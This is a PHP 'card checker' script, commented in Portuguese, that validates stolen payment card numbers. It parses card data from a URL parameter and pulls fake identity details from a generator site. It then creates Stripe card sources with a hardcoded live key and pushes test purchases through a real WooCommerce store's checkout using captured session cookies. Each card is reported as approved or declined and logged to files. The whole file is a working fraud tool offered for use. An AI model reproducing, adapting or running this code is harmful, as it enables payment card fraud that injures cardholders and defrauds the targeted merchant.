<?php

//strtoupper — Converte uma string para maiúsculas Ex: $teste = strtoupper(getStr($resposta, '',''));
// $variavel = (int)getStr2($pay, '',''); - (int) "Puchar valores inteiros da variavel"
// html_entity_decode - Converte HTML para retorno JSON (espeficico para pages sem JSON)
// str_shuffle = Embaralha nomes na string
// substr_count — Count the number of substring occurrences
// implode  - A função implode() retorna uma string dos elementos de um array.
// stristr - Pesquisa e retorna valores tipo, 'substr'
// empty = Retorna se a variavel esta vazia. Ex: if (empty($teste))
// null - Outra forma de retornar se esta vazia. (funciona em algumas ocassioes)
// strip_tags — Retira as tags HTML e PHP de uma string


// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


$time = time();


    error_reporting(0);

    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }

    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }


$ip = $_SERVER['REMOTE_ADDR'];


 /// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============


$metralhalindo = strlen($lista);

if (($metralhalindo < 7 ) or ($metralhalindo > 30 )) {

    die("#Error => Vai se foder randola kkkk...!");

}


$bloqueador_bin = substr($lista, 0, 4);


if (($bloqueador_bin == 6504 ) or ($bloqueador_bin == 6505 ) or ($bloqueador_bin == 6506 ) or ($bloqueador_bin == 6516 ) or ($bloqueador_bin ==  6011 ) or ($bloqueador_bin == 3747 ) or ($bloqueador_bin == 4960 ) or ($bloqueador_bin == 6509 ) or ($bloqueador_bin == 5543 ) or ($bloqueador_bin == 5333 )) {

die("#Error => Vai tacar gerada no cu da sua mae ....! ");


}

$bins_6dig = substr($lista, 0, 6);

if (($bins_6dig == 462239 ) or ($bins_6dig == 462239 ) or ($bins_6dig == 400022 )) {


    die("#Error => Vai tacar gerada no cu da sua mae ....!");


}

$ant_noia = substr($lista, 0, 8);
$ant_drogados = substr($lista, 0, 4);


if (($ant_drogados == 'Live')!== false ) {

    die("#Error => Vai se foder randola.....!");

}


if (($ant_noia == 'Aprovada') or ($ant_noia == 'Aprovado')!== false) {

die(json_encode(array("Error" => "Aqui nao noiado do carai...!")));


}


$verificar_ano = strlen($ano);


if (($verificar_ano < 4 ) or ($verificar_ano > 4 )){

    die("Ano de validade, invalida..! O correto é 4 números");

}


$verificar_mes = strlen($mes);


if (($verificar_mes > 2 ) or ($verificar_mes < 2 )) {

    die("Informacoes invalidas, inseridas no mês do cartao de crédito a ser verificado..!");


}


$verificar_cvv = strlen($cvv);


if (($verificar_cvv > 4 ) or ($verificar_cvv < 2 )) {

    die("Informacoes invalidas, inseridas no campo do CVV do cartao de crédito..!");


}

 $anti_reteste_dies = file_get_contents("./ant-reteste-dies.txt", "r");
 $anti_reteste_lives = file_get_contents("./ant-reteste-lives.txt", "r");


if (strpos($anti_reteste_dies, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

if (strpos($anti_reteste_lives, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

$falha_minusculas = substr($lista, 0, 1);

if (($falha_minusculas == 'a') or ($falha_minusculas == 'b') or ($falha_minusculas == 'c') or ($falha_minusculas == 'd') or ($falha_minusculas == 'e') or ($falha_minusculas == 'f') or ($falha_minusculas == 'g') or ($falha_minusculas == 'h') or ($falha_minusculas == 'i') or ($falha_minusculas == 'j') or ($falha_minusculas == 'k') or ($falha_minusculas == 'l') or ($falha_minusculas == 'm') or ($falha_minusculas == 'n') or ($falha_minusculas == 'o') or ($falha_minusculas == 'p') or ($falha_minusculas == 'q') or ($falha_minusculas == 'r') or ($falha_minusculas == 's') or ($falha_minusculas == 't') or ($falha_minusculas == 'u') or ($falha_minusculas == 'v') or ($falha_minusculas == 'w') or ($falha_minusculas == 'x') or ($falha_minusculas == 'y') or ($falha_minusculas == 'z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}


$falha_maiusculas = substr($lista, 0, 1);

if (($falha_maiusculas == 'A') or ($falha_maiusculas == 'B') or ($falha_maiusculas == 'C') or ($falha_maiusculas == 'D') or ($falha_maiusculas == 'E') or ($falha_maiusculas == 'F') or ($falha_maiusculas == 'G') or ($falha_maiusculas == 'H') or ($falha_maiusculas == 'I') or ($falha_maiusculas == 'J') or ($falha_maiusculas == 'K') or ($falha_maiusculas == 'L') or ($falha_maiusculas == 'M') or ($falha_maiusculas == 'N') or ($falha_maiusculas == 'O') or ($falha_maiusculas == 'P') or ($falha_maiusculas == 'Q') or ($falha_maiusculas == 'R') or ($falha_maiusculas == 'S') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'U') or ($falha_maiusculas == 'V') or ($falha_maiusculas == 'W') or ($falha_maiusculas == 'X') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'Z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}
 

$vencimento_ano = substr($ano, 0, 4);


if (($vencimento_ano == '2021') or ($vencimento_ano == '2020') or ($vencimento_ano == '2019') or ($vencimento_ano == '2018') or ($vencimento_ano == '2017') or ($vencimento_ano == '2016') or ($vencimento_ano == '2015') or ($vencimento_ano == '2014') or ($vencimento_ano == '2013') or ($vencimento_ano == '2012') or ($vencimento_ano == '2011') or ($vencimento_ano == '2010') or ($vencimento_ano == '2009')!== false) {


    die("#Error => CC da época das caverna meu irmão kkkkk...!");


}


$bloquear_ip = substr($cvv, 0, 3);


if (($bloquear_ip == '000' )!== false) {

      $file2 = fopen("IPS.txt", "a");
      fwrite($file2, "$ip\n");

          die("#Error => Tacou 000 né? Seu ip foi bloqueado ...!");
          
}


$ler_ips = file_get_contents("./IPS.txt", "r");

if (strpos($ler_ips, $ip)!== false) {

    die("Seu ip foi bloqueado por testar gerada.! Peça o desbloqueio para o desenvolvedor");


}


 /// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============



// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//

$verificar_bin = substr($lista, 0, 6);


$link = 'https://lookup.binlist.net/'.$verificar_bin.'';

$headers = array (

'accept: */*',
'origin: https://binlist.net',
'referer: https://binlist.net/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'


);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers);
$automatizacao_binssearch = curl_exec($ini);



$scheme = strtoupper(json_decode($automatizacao_binssearch, true)['scheme']);
$band = strtoupper(json_decode($automatizacao_binssearch, true)['brand']);
$bank = strtoupper(json_decode($automatizacao_binssearch, true)['bank']['name']);
$type = strtoupper(json_decode($automatizacao_binssearch, true)['type']);
$states = strtoupper(json_decode($automatizacao_binssearch, true)['country']['name']);

$prepaid = metraiapuxar($automatizacao_binssearch, '"prepaid":',',', 1);


if (empty($scheme)!== false) {

    $retorno_scheme = "NÃO ENCONTRADO";

} else {

    $retorno_scheme = ''.$scheme.'';

}

if (empty($band)!== false) {

    $retorno_band = "NÃO ENCONTRADO";

} else {

    $retorno_band = ''.$band.'';
    
}


if (empty($bank)!== false) {

    $retorno_bank = "NÃO ENCONTRADO";

} else {

    $retorno_bank = ''.$bank.'';
    
}


if (empty($type)!== false) {

    $retorno_type = "NÃO ENCONTRADO";

} else {

    $retorno_type = ''.$type.'';
    
}


if (empty($states)!== false) {

    $retorno_states = "NÃO ENCONTRADO";

} else {

    $retorno_states = ''.$states.'';
    
}


if ($prepaid == 'false'){

    $Verificar_prepaid = "NÃO";

} else if ($prepaid == null) {

    $Verificar_prepaid = "N/A";

} else if ($prepaid == 'null'){

    $Verificar_prepaid = "N/A";

} else {

    $Verificar_prepaid = "SIM";

}

// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//

## DADOS INFO - 4DEVS (API DADOS CHK)

$linkurl_dados = "https://www.4devs.com.br/ferramentas_online.php";
$post_dados = 'acao=gerar_pessoa&sexo=I&pontuacao=N&idade=0&cep_estado=&txt_qtde=1&cep_cidade=';
$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.54";


$header_4devs = array (

'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: '.$agent.''

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $linkurl_dados);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_4devs);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_dados);
$dados = curl_exec($ini);


$nome = metraiapuxar($dados, '"nome":"','"');
$cpf = metraiapuxar($dados, '"cpf":"','"');
$rg = metraiapuxar($dados, '"rg":"','"');
$data_nasc = metraiapuxar($dados, '"data_nasc":"','"');
$sexo = metraiapuxar($dados, '"sexo":"','"');
$mae = metraiapuxar($dados, '"mae":"','"');
$pai = metraiapuxar($dados, '"pai":"','"');
$cep = metraiapuxar($dados, '"cep":"','"');
$numero = metraiapuxar($dados, '"numero":',',', 1);
$endereco = metraiapuxar($dados, '"endereco":"','"');
$bairro = metraiapuxar($dados, '"bairro":"','"');
$celular = metraiapuxar($dados, '"celular":"','"');
$cidade = metraiapuxar($dados, '"cidade":"','"');
$email = metraiapuxar($dados, '"email": "','"', 1);
$telefone_fixo = metraiapuxar($dados, '"telefone_fixo":"','"');


## DADOS INFO - 4DEVS (API DADOS CHK)


// ================ // ====================//==========================//============================= // ================================//=================//


$link_checkout = "https://peikids.org/checkout/";

$header_checkout = array (

'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'cookie: PHPSESSID=748b815785a4e90d38358cdc6dc3f3ae; _ga=GA1.2.2085436306.1665510705; _gid=GA1.2.416561015.1665510705; _gat_gtag_UA_166205475_1=1; __stripe_mid=385a49cd-766d-4bfe-9df0-6d4c041380ab2dd9c8; __stripe_sid=c80b2ea6-ace4-4048-aebe-8027551a3fa38a8bdf; woocommerce_items_in_cart=1; wp_woocommerce_session_977ee23bbca34e854862e79b73ea9f94=t_62328b224d4042e51842bcf95debd5%7C%7C1665683519%7C%7C1665679919%7C%7Cf12e80cad3217dc585e86497b7d55209; woocommerce_cart_hash=c48d9c318b986fc7e0414b04fb3554f5; _gali=place_order',
'referer: https://peikids.org/cart/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.20'


);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_checkout);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_checkout);
$checkout = curl_exec($ini);




$header_stripesrc = array (


'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'

);


$link_stripesrc = "https://api.stripe.com/v1/sources";

$postfields_stripesrc = 'type=card&owner[name]='.$nome.'&owner[address][line1]='.$endereco.'&owner[address][line2]=543&owner[address][state]=PR&owner[address][city]='.$cidade.'&owner[address][postal_code]='.$cep.'&owner[address][country]=BR&owner[email]=carlosdurao2022@gmail.com&owner[phone]='.$telefone_fixo.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=b2cc7200-b58b-409c-b3f8-a36cb004441a9d8a85&muid=385a49cd-766d-4bfe-9df0-6d4c041380ab2dd9c8&sid=c80b2ea6-ace4-4048-aebe-8027551a3fa38a8bdf&pasted_fields=number&payment_user_agent=stripe.js%2F039b3c8ec%3B+stripe-js-v3%2F039b3c8ec&time_on_page=21107&key=pk_live_Vlfn6uQutYeLSLZdbRkId4iY006iz21N4t';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_stripesrc);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_stripesrc);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_stripesrc);
$meupiru = curl_exec($ini);
$id_do_carai = metraiapuxar($meupiru, 'id": "', '"', 1);


$nonce_carai = metraiapuxar($checkout, 'id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','"', 1);


$header_pagar = array (

'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: PHPSESSID=748b815785a4e90d38358cdc6dc3f3ae; _ga=GA1.2.2085436306.1665510705; _gid=GA1.2.416561015.1665510705; _gat_gtag_UA_166205475_1=1; __stripe_mid=385a49cd-766d-4bfe-9df0-6d4c041380ab2dd9c8; __stripe_sid=c80b2ea6-ace4-4048-aebe-8027551a3fa38a8bdf; woocommerce_items_in_cart=1; wp_woocommerce_session_977ee23bbca34e854862e79b73ea9f94=t_62328b224d4042e51842bcf95debd5%7C%7C1665683519%7C%7C1665679919%7C%7Cf12e80cad3217dc585e86497b7d55209; woocommerce_cart_hash=c48d9c318b986fc7e0414b04fb3554f5; _gali=place_order',
'origin: https://peikids.org',
'referer: https://peikids.org/checkout/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.20',
'x-requested-with: XMLHttpRequest'


);

$link_pagar = "https://peikids.org/?wc-ajax=checkout";

$postfields_pagar = 'billing_first_name='.$nome.'&billing_last_name='.$nome.'&billing_company=&billing_country=BR&billing_address_1='.$endereco.'&billing_address_2=casa&billing_city='.$cidade.'&billing_state=SP&billing_postcode='.$cep.'&billing_phone='.$telefone_fixo.'&billing_email=carlosdurao2022@gmail.com&order_comments=&payment_method=stripe&woocommerce-process-checkout-nonce='.$nonce_carai.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$id_do_carai.'';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_pagar);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_pagar);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_pagar);
$pagar = curl_exec($ini);



if (strpos($pagar, 'Return to shop')!== false ) {

    die("#Error => Session expired...!");

} else if (strpos($pagar, 'Session expired')!== false ) {

    die("Error => Checker off, sessão expirada..!");

} else if (strpos($pagar, 'your session has expired')!== false ) {

    die("#Error => Sua sessao acabou de expirar..!");

}



$retorno = json_decode($pagar, true)['messages'];


$retorno_true = metraiapuxar($pagar, '{',',', 1);
$retorno_denny = json_decode($pagar, true)['result'];




if (strpos($retorno_true, '"result":"failure"')!== false){

    $Verificacao_live = 'N/A - Allow Denny: '.$retorno_denny.'';

} else if (empty($retorno_true)!== false ) {

    $Verificacao_live = "Retorno nao indentificado: N/A";

}

else {

    $Verificacao_live = 'Order received: '.$retorno_true.'';

}







if(strpos($pagar, '"result":"failure"')!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> $retorno  » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-warning'>Result Gateway</span> $Verificacao_live <span class='badge badge-primary'>CREDITOS RESTANTE:</span> $saldo_total  - IP: $ip <br>";


      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

} else if (empty($pagar)!== false ) {

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> $retorno  » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-warning'>Result Gateway</span> Error de Proxy..!  ($Verificacao_live)<br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

}

else {

    echo "<span class='badge badge-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-warning'>RETORNO</span> $Verificacao_live <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";


      $file = fopen("ant-reteste-lives.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");


}

?>